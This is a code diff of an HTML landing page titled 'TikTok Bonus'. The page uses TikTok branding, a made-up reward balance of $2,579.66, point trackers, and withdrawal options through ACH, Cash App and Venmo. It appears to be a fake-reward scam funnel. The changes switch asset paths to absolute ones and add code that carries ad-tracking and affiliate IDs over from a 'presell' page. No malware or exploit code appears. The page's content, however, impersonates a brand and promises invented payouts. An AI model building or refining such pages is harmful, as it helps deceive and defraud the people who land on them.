@@ -8,7 +8,7 @@
   <title>TikTok Bonus</title>
 
 
-  <link rel="stylesheet" href="css/style.css?v=20260731fix">
+  <link rel="stylesheet" href="/css/style.css?v=20260731fix">
 
 
   <script>
@@ -45,8 +45,19 @@
         accept_lang: navigator.languages ? navigator.languages.join(',') : '',
       };
 
-      // Captura todos os utm_* e ttclid da URL de entrada sem deixar sobrescrever depois
+      // Captura todos os utm_* e ttclid da URL de entrada (e do sessionStorage da presell) sem deixar sobrescrever depois
       var entryParams = {};
+      try {
+        var savedEntry = JSON.parse(sessionStorage.getItem("__ttk_entry_params") || "{}");
+        Object.keys(savedEntry).forEach(function (k) {
+          if ((/^utm_/.test(k) || k === "ttclid") && savedEntry[k]) {
+            entryParams[k] = savedEntry[k];
+          }
+          if (!sk && (k === "aff_sub" || k === "okto_sk") && savedEntry[k]) {
+            sk = savedEntry[k];
+          }
+        });
+      } catch (e) {}
       p.forEach(function (v, k) {
         if ((/^utm_/.test(k) || k === 'ttclid') && v) {
           entryParams[k] = v;
@@ -152,7 +163,7 @@
 
       <div id="id-loading"
         style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:40px 24px;text-align:center;">
-        <img src="images/tiktok-logo.webp" alt="TikTok" style="height:36px;margin-bottom:40px;">
+        <img src="/images/tiktok-logo.webp" alt="TikTok" style="height:36px;margin-bottom:40px;">
         <div style="display:flex;gap:10px;margin-bottom:20px;">
           <span
             style="width:11px;height:11px;border-radius:50%;background:#EE1D52;animation:idDot 1.2s ease-in-out infinite;"></span>
@@ -219,7 +230,7 @@
 
 
     <section id="dashboard" class="screen">
-      <div class="title"><img src="images/tiktok-official.svg" alt="TikTok" style="height:22px;width:auto;"></div>
+      <div class="title"><img src="/images/tiktok-official.svg" alt="TikTok" style="height:22px;width:auto;"></div>
 
       <div class="bloco-dois">
         <div class="parabens">
@@ -229,7 +240,7 @@
 
             <span class="parabens-valor">$2,579.66</span>
           </div>
-          <img src="images/parabens-img.png" alt="" class="parabens-img">
+          <img src="/images/parabens-img.png" alt="" class="parabens-img">
         </div>
         <div style="padding:18px 20px 8px;width:100%;box-sizing:border-box;">
           <button type="button" class="btn-sacar" aria-label="Withdraw"
@@ -256,7 +267,7 @@
               <div class="day-tracker__box">
                 <div class="day-tracker__content">
                   <div class="day-tracker__coin">
-                    <img src="images/p-dia.svg" alt="">
+                    <img src="/images/p-dia.svg" alt="">
                   </div>
                   <div class="day-tracker__value">50</div>
                 </div>
@@ -264,7 +275,7 @@
                 <div class="day-tracker__overlay">
                   <div class="day-tracker__icon-wrapper">
                     <div class="day-tracker__icon-shape">
-                      <img src="images/fi-bs-check.svg" alt="">
+                      <img src="/images/fi-bs-check.svg" alt="">
                     </div>
                   </div>
                 </div>
@@ -277,7 +288,7 @@
               <div class="day-tracker__box">
                 <div class="day-tracker__content">
                   <div class="day-tracker__coin">
-                    <img src="images/p-dia.svg" alt="">
+                    <img src="/images/p-dia.svg" alt="">
                   </div>
                   <div class="day-tracker__value">100</div>
                 </div>
@@ -285,7 +296,7 @@
                 <div class="day-tracker__overlay">
                   <div class="day-tracker__icon-wrapper">
                     <div class="day-tracker__icon-shape">
-                      <img src="images/fi-bs-check.svg" alt="">
+                      <img src="/images/fi-bs-check.svg" alt="">
                     </div>
                   </div>
                 </div>
@@ -298,7 +309,7 @@
               <div class="day-tracker__box">
                 <div class="day-tracker__content">
                   <div class="day-tracker__coin">
-                    <img src="images/p-dia.svg" alt="">
+                    <img src="/images/p-dia.svg" alt="">
                   </div>
                   <div class="day-tracker__value">150</div>
                 </div>
@@ -306,7 +317,7 @@
                 <div class="day-tracker__overlay">
                   <div class="day-tracker__icon-wrapper">
                     <div class="day-tracker__icon-shape">
-                      <img src="images/fi-bs-check.svg" alt="">
+                      <img src="/images/fi-bs-check.svg" alt="">
                     </div>
                   </div>
                 </div>
@@ -319,7 +330,7 @@
               <div class="day-tracker__box">
                 <div class="day-tracker__content">
                   <div class="day-tracker__coin">
-                    <img src="images/p-dia.svg" alt="">
+                    <img src="/images/p-dia.svg" alt="">
                   </div>
                   <div class="day-tracker__value">200</div>
                 </div>
@@ -327,7 +338,7 @@
                 <div class="day-tracker__overlay">
                   <div class="day-tracker__icon-wrapper">
                     <div class="day-tracker__icon-shape">
-                      <img src="images/fi-bs-check.svg" alt="">
+                      <img src="/images/fi-bs-check.svg" alt="">
                     </div>
                   </div>
                 </div>
@@ -340,7 +351,7 @@
               <div class="day-tracker__box">
                 <div class="day-tracker__content">
                   <div class="day-tracker__coin">
-                    <img src="images/p-dia.svg" alt="">
+                    <img src="/images/p-dia.svg" alt="">
                   </div>
                   <div class="day-tracker__value">250</div>
                 </div>
@@ -348,7 +359,7 @@
                 <div class="day-tracker__overlay">
                   <div class="day-tracker__icon-wrapper">
                     <div class="day-tracker__icon-shape">
-                      <img src="images/fi-bs-check.svg" alt="">
+                      <img src="/images/fi-bs-check.svg" alt="">
                     </div>
                   </div>
                 </div>
@@ -361,7 +372,7 @@
               <div class="day-tracker__box">
                 <div class="day-tracker__content">
                   <div class="day-tracker__coin">
-                    <img src="images/p-dia.svg" alt="">
+                    <img src="/images/p-dia.svg" alt="">
                   </div>
                   <div class="day-tracker__value">300</div>
                 </div>
@@ -369,7 +380,7 @@
                 <div class="day-tracker__overlay">
                   <div class="day-tracker__icon-wrapper">
                     <div class="day-tracker__icon-shape">
-                      <img src="images/fi-bs-check.svg" alt="">
+                      <img src="/images/fi-bs-check.svg" alt="">
                     </div>
                   </div>
                 </div>
@@ -413,28 +424,28 @@
           <div class="progress-bar">
             <div class="progress-step">
               <div class="step-icon">
-                <img src="images/p-assista.svg" alt="P">
+                <img src="/images/p-assista.svg" alt="P">
               </div>
               <span class="step-text">50 points</span>
             </div>
 
             <div class="progress-step">
               <div class="step-icon">
-                <img src="images/p-assista.svg" alt="P">
+                <img src="/images/p-assista.svg" alt="P">
               </div>
               <span class="step-text">100 points</span>
             </div>
 
             <div class="progress-step">
               <div class="step-icon">
-                <img src="images/p-assista.svg" alt="P">
+                <img src="/images/p-assista.svg" alt="P">
               </div>
               <span class="step-text">150 points</span>
             </div>
 
             <div class="progress-step">
               <div class="step-icon">
-                <img src="images/p-assista.svg" alt="P">
+                <img src="/images/p-assista.svg" alt="P">
               </div>
               <span class="step-text">225 points</span>
             </div>
@@ -473,21 +484,21 @@
           <div class="progress-bar">
             <div class="progress-step hide">
               <div class="step-icon">
-                <img src="images/p-assista.svg" alt="P">
+                <img src="/images/p-assista.svg" alt="P">
               </div>
               <span class="step-text">16 searches</span>
             </div>
 
             <div class="progress-step">
               <div class="step-icon">
-                <img src="images/p-assista.svg" alt="P">
+                <img src="/images/p-assista.svg" alt="P">
               </div>
               <span class="step-text">36 searches</span>
             </div>
 
             <div class="progress-step">
               <div class="step-icon">
-                <img src="images/p-assista.svg" alt="P">
+                <img src="/images/p-assista.svg" alt="P">
               </div>
               <span class="step-text">60 searches</span>
             </div>
@@ -522,7 +533,7 @@
         </div>
       </div>
       <div class="title" style="display:flex;align-items:center;justify-content:center;padding:8px 0;">
-        <img src="images/tiktok-logo.webp" alt="TikTok" style="height:28px;width:auto;display:block;">
+        <img src="/images/tiktok-logo.webp" alt="TikTok" style="height:28px;width:auto;display:block;">
       </div>
       <div class="saldo saldo-dois">
         <div class="container-saldo" role="region" aria-labelledby="saldo-title">
@@ -538,7 +549,7 @@
           </div>
 
           <div class="saldo-action">
-            <span class="saldo-img"><img src="images/p-saldo-maior.png" alt="" class="p-saldo p-saldo-maior"></span>
+            <span class="saldo-img"><img src="/images/p-saldo-maior.png" alt="" class="p-saldo p-saldo-maior"></span>
           </div>
         </div>
       </div>
@@ -561,7 +572,7 @@
             </div>
 
             <div class="saldo-valor" aria-live="polite">
-              <span class="transferencia-txt"><img src="images/fi-rs-credit-card.png" alt="">Transfer via / <span
+              <span class="transferencia-txt"><img src="/images/fi-rs-credit-card.png" alt="">Transfer via / <span
                   class="payment-badge-text">ACH</span></span>
             </div>
           </div>
@@ -596,14 +607,14 @@
 
             <button type="button" class="three-method-btn" data-method="cashapp"
               style="flex:1;padding:12px 6px 10px;border:1.5px solid #e5e5e5;border-radius:10px;background:#fff;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:5px;transition:all .2s;">
-              <img src="images/cashapp.svg" alt="Cash App" style="height:22px;width:auto;">
+              <img src="/images/cashapp.svg" alt="Cash App" style="height:22px;width:auto;">
               <span style="font-size:11px;font-weight:600;color:#555;">Cash App</span>
             </button>
 
 
             <button type="button" class="three-method-btn" data-method="venmo"
               style="flex:1;padding:12px 6px 10px;border:1.5px solid #e5e5e5;border-radius:10px;background:#fff;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:5px;transition:all .2s;">
-              <img src="images/Venmo-Logo.wine.png" alt="Venmo" style="height:22px;width:auto;object-fit:contain;">
+              <img src="/images/Venmo-Logo.wine.png" alt="Venmo" style="height:22px;width:auto;object-fit:contain;">
               <span style="font-size:11px;font-weight:600;color:#555;">Venmo</span>
             </button>
 
@@ -642,7 +653,7 @@
 
       <div class="saldo saldo-sacar">
         <div class="container-saldo ctn-flor" role="region" aria-labelledby="saldo-title">
-          <img src="images/flor.png" alt="" class="flor">
+          <img src="/images/flor.png" alt="" class="flor">
           <div class="saldo-info obtenha-title">
             <div class="saldo-label">
               <span class="saldo-sacar-text obtenha-txt">Get Coins for LIVE</span>
@@ -691,7 +702,7 @@
       <header class="loading-header">
 
         <div class="loading-logo">
-          <img src="images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok Logo" class="loading-logo-img">
+          <img src="/images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok Logo" class="loading-logo-img">
         </div>
       </header>
 
@@ -712,7 +723,7 @@
 
         <div class="confirmation-header">
           <div class="confirmation-logo">
-            <img src="images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok">
+            <img src="/images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok">
           </div>
         </div>
 
@@ -944,7 +955,7 @@
     window.animateCurrencyCounter = animateCurrencyCounter;
   </script>
 
-  <script src="js/main.js"></script>
+  <script src="/js/main.js"></script>
 
   <style>
     /* Animação de entrada da tela #dashboard */
